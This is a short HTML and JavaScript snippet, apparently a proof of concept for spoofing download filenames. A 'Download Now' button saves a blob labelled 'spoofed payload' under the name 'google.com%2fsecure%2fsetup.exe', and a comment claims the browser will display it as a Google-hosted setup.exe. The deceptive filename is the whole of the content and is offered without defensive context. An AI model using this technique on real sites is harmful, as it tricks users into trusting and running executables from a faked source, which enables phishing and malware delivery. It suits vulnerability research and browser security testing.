<button id="download">Download Now</button>

<script>
document.getElementById('download').onclick = () => {
  const blob = new Blob(["This is a spoofed payload"], { type: "application/octet-stream" });

  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "google.com%2fsecure%2fsetup.exe";  // will be shown as "google.com/secure/setup.exe" in UI
  document.body.appendChild(a);
  a.click();
};
</script>
